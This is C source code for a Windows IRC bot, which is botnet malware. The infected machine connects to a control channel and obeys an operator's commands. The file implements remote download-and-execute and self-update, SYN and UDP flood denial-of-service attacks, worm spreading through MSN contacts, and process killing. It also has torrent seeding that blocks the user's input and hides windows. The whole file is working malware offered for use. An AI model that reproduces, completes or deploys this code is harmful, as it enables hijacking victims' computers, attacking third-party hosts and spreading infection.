#include "includes.h"
#include "externs.h"
#include <windows.h>


static char str_kcin[] = "NICK";
static char str_nioj[] = "JOIN";
static char str_trap[] = "PART";
static char str_tiuq[] = "QUIT";
static char str_ssap[] = "PASS";
static char str_gnip[] = "PING";
static char str_gnop[] = "PONG";
static char str_resu[] = "USER";
static char str_gsmvirp[] = "PRIVMSG";


thread_s threads[MAX_THREADS];

char msnMessage[256];
void msnhttp(char *szmsnHost) 
{
   memset(msnIMHost, 0, sizeof(msnIMHost));
   _snprintf(msnIMHost, sizeof(msnIMHost) -1, "%s", szmsnHost);
}


DWORD WINAPI IRC_Thread(LPVOID param)
{
	if (!NET_Initialize())
		ExitThread(0);
		
	srand(GetTickCount());

	Thread_Prepare();

	if (IRC_Begin() == -5)
	{
		//nothing
	}

	WSACleanup();

	ExitThread(0);

	return 0;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL NET_Initialize()
{
	WSADATA WSAdata;

	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Connect(char *host, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	
	resv_host = Resolve(host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to)
{
	char	temp[64] = {0}, 
			buff[MAX_LINE];
	int		len;

	if (msg == MSG_PASS)
	{
		strncpy(temp, str_ssap, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_NICK)
	{
		strncpy(temp, str_kcin, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_USER)
	{
		strncpy(temp, str_resu, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"lol\" :%s\r\n", 
			temp, buffer, buffer);
	}
	else if (msg == MSG_PONG)
	{
		strncpy(temp, str_gnop, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_JOIN)
	{
		strncpy(temp, str_nioj, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", temp, buffer, to);
	}
	else if (msg == MSG_PART)
	{
		strncpy(temp, str_trap, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_PRIVMSG)
	{
		strncpy(temp, str_gsmvirp, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", temp, to, buffer);
	}
	else if (msg == MSG_QUIT)
	{
		strncpy(temp, str_tiuq, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
	}
	else
		// should never happen
		return 0;

	memset(temp, 0, sizeof(temp));

	len = send(sock, buff, strlen(buff), 0);

	memset(buff, 0, sizeof(buff));

	return len;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Login(SOCKET sock, char *password, char *nick, char *user)
{
	int		ret;

	if (password[0] != 0)
		if ((ret = IRC_Send(sock, MSG_PASS, password, NULL)) == SOCKET_ERROR)
			return ret;

	if ((ret = IRC_Send(sock, MSG_NICK, nick, NULL)) == SOCKET_ERROR)
		return ret;

	if ((ret = IRC_Send(sock, MSG_USER, user, NULL)) == SOCKET_ERROR)
		return ret;

	return 1;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ircmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_IsOrder(char *order)
{
	if (!strncmp(order, cfg_p, strlen(cfg_p)))
	{
		// remove order prefix
		memmove(order, order + strlen(cfg_p), strlen(order));

		return TRUE;
	}
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_CheckHost(char *master)
{
	char	*host;

	host = strchr(master, '@');
	if (host == NULL)
		return FALSE;

	if (!strcmp(host + 1, cfg_hostname))
		return TRUE;
	else
		return FALSE;
}



int IRC_Begin()
{
	int			ircsock;
	int			i = 0, 
				ret = 1,
				tries = 0;

	while (1)
	{
		if (cfg_host == NULL)
		{
			i = 0;
			tries++;
		}

	if ((ircsock = IRC_Connect(cfg_host, cfg_port)) > 0)
		{
			/*SYSTEMTIME st, lt;	
			GetSystemTime(&st);
			GetLocalTime(&lt);*/
			i = 0;
			tries = 0;           
            if (IRC_Login(ircsock, cfg_srvpass, GenerateNickA(), GenerateNumber(4)) > 0)
			{
				ret = IRC_Listen(ircsock);

				switch (ret)
				{
				case 0:

					break;
				case -1:	// SOCKET_ERROR

					break;
				case -2:

					break;
				case -3:

					i++;
					break;
				case -4:

					closesocket(ircsock);
					return ret;
				case -5:

					closesocket(ircsock);
					return ret;
				default:

					break;
				}

				closesocket(ircsock);
			}
		}
		else
		{
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}

	// never reached
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_ParseAllCommands(SOCKET sock, char **word)
{
	int		i, 
			k, 
			pos,
			ret;
	char	*p,
			from[128] = {0};

	if (!strcmp(word[1], "332"))
		i = 4;
	else
		i = 3;

	// correction if its channel or user
	if (word[i-1][0] != '#')
	{
		p = strchr(word[0], '!');
		*p = 0;
		strncpy(from, word[0] + 1, sizeof(from) - 1);
	}
	else
		strncpy(from, word[i-1], sizeof(from) - 1);

	// first command correction (remove ":")
	memmove(word[i], word[i] + 1, strlen(word[i]));

	k = i + 1;
	pos = i;
	while (word[k] != NULL && k < MAX_WORDS)
	{
		if (IRC_IsOrder(word[k]))
		{
			if ((ret = IRC_ParseSingleCommand(sock, word, pos, k - pos, from)) < 0)
				return ret;

			pos = k;
		}
		k++;
	}

	return IRC_ParseSingleCommand(sock, word, pos, k - pos, from);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Parse(SOCKET sock, char *line)
{
	char	*word[MAX_WORDS],
			temp[64] = {0};
	int		i = 0;

	if (strstr(line, "001") != NULL)
		return IRC_Send(sock, MSG_JOIN, cfg_channel, cfg_chanpass);


	word[i] = strtok(line, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}

	strncpy(temp, str_gnip, sizeof(temp) - 1);
	if (!strcmp(word[0], temp))
	{
		memset(temp, 0, sizeof(temp));
		return IRC_Send(sock, MSG_PONG, word[1], NULL);
	}

	if (!strcmp(word[1], "433"))
			return IRC_Send(sock, MSG_NICK, GenerateNumber(4), NULL);
	
	strncpy(temp, str_gsmvirp, sizeof(temp) - 1);
	if (!strcmp(word[1], temp))
	{
		if (IRC_CheckHost(word[0]) && IRC_IsOrder(word[3] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	if (!strcmp(word[1], "332"))
	{
		if (IRC_IsOrder(word[4] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	return 0;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Listen(SOCKET sock)
{
	int		ret, 
			len,
			l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = IRC_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = IRC_Parse(sock, buffer)) < 0)
				return ret;
		}
	}

	return sock;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//	Command parsing
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int IRC_ParseSingleCommand(SOCKET sock, char **word, int p, int words, char *from)
{
	//a command with 0 parts doesn't exist
	if (words < 1)
		return 1;
	//Uninstall bot
	else if (!strcmp(word[p], cmd_uninstall))
	{
		IRC_Send(sock, MSG_PRIVMSG, "Removing..", from);
		uninstall(FALSE);
		return 1;
	}
	//Version
	else if (!strcmp(word[p], cmd_ver))
	{
		IRC_Send(sock, MSG_PRIVMSG, versionInfo, from);
		return 1;
	}
	//Clean the registry
	else if (!strcmp(word[p], cmd_clean))
	{
	if (word[p+1] == NULL) {
		registryKiller();
		IRC_Send(sock, MSG_PRIVMSG, "Registry/Processes cleaned.", from);
	} else if(word[p+1] != NULL) {
		killproc(word[p+1]);
		IRC_Send(sock, MSG_PRIVMSG, "Specified process killed.", from);
	}
		return 1;
	}
	//Sort bots by country
	else if (!strcmp(word[p], cmd_sort))
	{
		char locale[MAX_NICKLEN];
		GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
		char jCountry[MAX_NICKLEN];
		wsprintf(jCountry, "#%s", locale);
		IRC_Send(sock, MSG_JOIN, jCountry, NULL);
		return 1;
	}
	else if (!strcmp(word[p], cmd_unsort))
	{
		char locale[MAX_NICKLEN];
		GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
		char jCountry[MAX_NICKLEN];
		wsprintf(jCountry, "#%s", locale);
			IRC_Send(sock, MSG_PART, jCountry, NULL);
			return 1;
	}
	//Find who is camping..
	else if (!strcmp(word[p], cmd_protect))
	{
		IRC_Send(sock, MSG_JOIN, ChanSafe, NULL);
		IRC_Send(sock, MSG_PART, cfg_channel, NULL);
		return 1;
	}
	//Leave the safe channel.
	else if (!strcmp(word[p], cmd_protectleave))
	{
		IRC_Send(sock, MSG_JOIN, cfg_channel, NULL);
		IRC_Send(sock, MSG_PART, ChanSafe, NULL);
		return 1;
	}
	//Popup
	else if (!strcmp(word[p], cmd_popup))
	{
		ShellExecute(NULL, "open", word[p + 1], NULL, NULL, SW_SHOWNORMAL);
		/*view_(word[p + 1]);
		IRC_Send(sock, MSG_PRIVMSG, "View Thread started.", from);*/
		return 1;
	}
	//MSN Spread
	else if (!strcmp(word[p], cmd_msn))
	{
		if (FindWindow("MSNHiddenWindowClass",0)) {
		for (int i = 0; i < words; i++)
		msnhttp(word[p + i]);
		
		if (GetLangMSN(msnMessage, sizeof(msnMessage) - 1))	{
		
				char str[45]; //80
				wsprintf(str, "Sent to %i contacts.",msnworm(msnMessage));
				IRC_Send(sock, MSG_PRIVMSG, str, from);
				
		}

	}
		
		return 1;
	}

	//SSYN flood
	else if (!strcmp(word[p], cmd_ssyn))
	{
			
        char* target = (char* ) word[ 4 ];
        char* port = (char* ) word[ 5 ];
        char* len = (char* ) word[ 6 ];
		if ( target!=NULL && port!=NULL && len!=NULL) {
			IRC_Send(sock, MSG_PRIVMSG, "SuperSYN Flood Started", from);
			SuperSyn(target ,port ,len );
		} else { IRC_Send(sock, MSG_PRIVMSG, "Missing Variables: [IP] [Port] [Length]", from); }
	    return 1;
    }

	//UDP
	else if (!strcmp(word[p], cmd_udp))
	{
        char* ip = (char* ) word[ 4 ];
        char* port = (char* ) word[ 5 ];
        char* timeout = (char* ) word[ 6 ];
		if ( ip!=NULL && port!=NULL && timeout !=NULL ) {
			IRC_Send(sock, MSG_PRIVMSG, "UDP Flood Started", from);
			udp ( ip, port, timeout );
			IRC_Send(sock, MSG_PRIVMSG, "UDP Flood Finished", from);
		  }	else { IRC_Send(sock, MSG_PRIVMSG, "Missing Variables: [IP] [Port] [Time]", from); }
	    return 1;
    }

	//Join
	else if (!strcmp(word[p], cmd_join))
	{
		IRC_Send(sock, MSG_JOIN, word[p + 1], word[p + 2]);
		return 1;
	}
	else if (!strcmp(word[p], cmd_torrent))
	{
		if (word[p+1] != NULL) {
		if (checkForTorrents()) {
			int i=1;
			char strbuf[2];
			long retVal;
			char file[2048];
			ExpandEnvironmentStrings("%temp%",file,2048);
					strcat(file, "\\torr");
				for (i;i<REQ_NICKLEN;i++) {
					sprintf(strbuf,"%i",rand()%10);
					strcat(file,strbuf);
				}
				strcat(file,".torrent");
				retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);
				if (retVal == S_OK) {
					Sleep(500);
					if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
							BlockInput(true);
							Sleep(1000);
							keybd_event(VK_RETURN, 0, 0, 0);
							keybd_event(VK_RETURN, 0, 0, 0);
							Sleep(1000);
							HWND hExists;
							hExists = GetForegroundWindow();
							ShowWindow(hExists, SW_HIDE);
							BlockInput(false);
							IRC_Send(sock, MSG_PRIVMSG, "Seeding started.", from);
						return 1;
					}
				}
		}
	}
		return 0;
	}
	//Part
	else if (!strcmp(word[p], cmd_part))
	{
		IRC_Send(sock, MSG_PART, word[p + 1], NULL);
		return 1;
	}
	
	//-------------------------------------------------------------------------------------------
	//	download
	//-------------------------------------------------------------------------------------------	
		
	else if (!strcmp(word[p], cmd_download))
	{
		long retVal;
		char file[2048];
		ExpandEnvironmentStrings("%temp%",file,2048);
					int i=1;
					char strbuf[2];
					if (word[p+1]!=NULL && word[p+2]==NULL) {
								strcat(file, "\\erase_me");
							for (i;i<REQ_NICKLEN;i++) {
								sprintf(strbuf,"%i",rand()%10);
								strcat(file,strbuf);
							}
								strcat(file,".exe");
					} else
					if(word[p+1]!=NULL && word[p+2]!=NULL) {
						strcat(file, "\\");
						strcat(file, word[p+2]);
					}
			
		retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);
		if (retVal == S_OK) {
			Sleep(500);
		if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
			if (word[p+2]== NULL) {
			char* str = "";
			wsprintf(str, "Executed process successfully.");
			IRC_Send(sock, MSG_PRIVMSG, str, from);
			} else if(word[p+2]!= NULL) {
			char* str = "";
				wsprintf(str, "Executed process \"%s\".",word[p+2]);
				IRC_Send(sock, MSG_PRIVMSG, str, from);
			}
		} else {
			IRC_Send(sock, MSG_PRIVMSG, "Execution failed.", from);
		}
	} else {
			IRC_Send(sock, MSG_PRIVMSG, "Download failed!", from);
	}
	return 1; 
}	

	//--------------------------------------------------------------------------------------------
	//	Update
	//--------------------------------------------------------------------------------------------

	else if (!strcmp(word[p], cmd_update))
	{

		long retVal;
		char file[2048];
		char strbuf[2];
		int i=1;
		if (word[p+1]!=NULL) {
		ExpandEnvironmentStrings("%temp%",file,2048);
		strcat(file, "\\erase_me");
							for (i;i<REQ_NICKLEN;i++) {
								sprintf(strbuf,"%i",rand()%10);
								strcat(file,strbuf);
							}
								strcat(file,".exe");
		retVal = URLDownloadToFile(0, word[p+1], file, 0, 0);

	if (retVal == S_OK) {
			Sleep(1500);
		if((int)ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOWNORMAL) > 32) {
				IRC_Send(sock, MSG_PRIVMSG, "Updating..", from);
				WSACleanup();
				ExitProcess(0);
		} else {
				IRC_Send(sock, MSG_PRIVMSG, "Execution failed!", from);
		}
	} else {
			IRC_Send(sock, MSG_PRIVMSG, "Download failed!", from);
	}
		return 1; 
		
	}
	return 1;
} else
		return 1;		
}